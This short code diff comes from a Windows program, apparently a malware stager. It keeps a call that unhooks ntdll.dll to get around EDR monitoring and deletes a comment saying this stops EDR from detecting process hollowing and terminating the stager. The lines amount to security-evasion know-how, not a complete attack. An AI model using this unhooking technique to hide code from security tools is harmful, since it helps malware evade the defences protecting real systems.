@@ -3,7 +3,6 @@
 int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
 	// Unhook DLL's that are monitored by EDR.
-	// Otherwise, the call sequence analysis of process hollowing gets detected and the stager is terminated.
 	UnhookDll(L"ntdll.dll");
 	if (IsWindows10OrGreater() || sizeof(LPVOID) == 8)
 	{
